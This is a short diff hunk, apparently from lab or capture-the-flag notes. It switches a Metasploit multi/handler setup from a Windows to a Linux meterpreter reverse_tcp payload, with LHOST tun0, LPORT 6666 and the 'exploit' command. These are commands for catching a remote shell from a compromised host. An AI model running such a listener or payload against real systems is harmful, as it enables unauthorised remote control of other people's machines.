@@ -14,7 +14,7 @@ set PAYLOAD java/meterpreter/reverse_tcp
 sudo msfconsole
 
 use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
+set PAYLOAD linux/meterpreter/reverse_tcp
 set LHOST tun0
 set LPORT 6666
 exploit
